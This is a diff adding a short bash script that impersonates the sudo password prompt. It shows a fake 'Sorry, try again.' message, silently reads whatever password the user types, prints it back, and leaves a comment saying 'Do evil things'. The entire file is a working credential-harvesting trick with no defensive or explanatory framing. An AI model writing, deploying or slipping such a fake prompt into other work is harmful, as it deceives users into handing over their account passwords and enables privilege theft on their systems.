@@ -1,0 +1,11 @@
+#!/bin/bash
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root"
+else
+   echo "Sorry, try again."
+   echo -n "[sudo] password for $SUDO_USER: "
+   read -s tmp
+   echo ""
+   echo "PASSWORD IS $tmp"
+   # Do evil things
+fi
